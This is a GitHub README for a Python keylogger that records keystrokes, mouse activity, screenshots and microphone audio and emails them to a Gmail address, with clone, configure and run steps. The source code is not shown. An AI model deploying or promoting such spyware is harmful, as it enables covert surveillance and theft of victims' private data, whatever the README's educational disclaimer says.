
# KeyLoggers

## Overview
This project implements a simple keylogger that tracks keyboard inputs, mouse events, microphone recordings, and takes screenshots at regular intervals. It collects system information and sends periodic reports via email to a specified Gmail address.

**Key features:**
- Logs keyboard input (key presses).
- Monitors mouse activity (clicks, movement, scrolling).
- Takes screenshots of the user's screen.
- Records audio from the microphone.
- Sends the collected data via email to a specified Gmail address.

**Important:**  
This script is designed for educational purposes only. Misuse of keylogging software is illegal in many jurisdictions. Ensure you have explicit permission before using this software on any machine.

## Prerequisites
Make sure you have the following libraries installed:
- `pynput`:  capturing keyboard and mouse events.
- `pyscreenshot`:  taking screenshots.
- `sounddevice`: recording audio from the microphone.
- `wave`: saving the audio in `.wav` format.
- `PIL`: handling image operations.
- `smtplib`:  sending the email.


## requirements.txt
Save this text as a file named requirements.txt.
Install the required libraries using pip by running:

```bash
pip install -r requirements.txt
```

## Configuration
Before running the script, configure the following:
1. **Email Address:** Replace the `email_address` variable with your own Gmail address.
2. **App Password:** You need to create a Gmail App Password (you can do this in the Google account security settings). Replace the `app_password` variable with the generated app password.

Example:
```python
email_address = "your_email@gmail.com"
app_password = "your_app_password"
```

## Usage

1. **Clone the repository** (or save the Python file locally).
```bash
git clone https://github.com/MUKILESH7/Keyloggers.git
```
2.Change directory:
```bash
cd keyloggers
```
3. Run the script:

```bash
python keylogger.py
```

Once the script is running, it will:
- Start logging keyboard events.
- Monitor mouse activity.
- Capture system information.
- Periodically send an email with the logged data.
- Capture microphone audio and screenshots.

### Stop the Keylogger
To stop the keylogger, you can press `Ctrl + C` or kill the Python process manually.

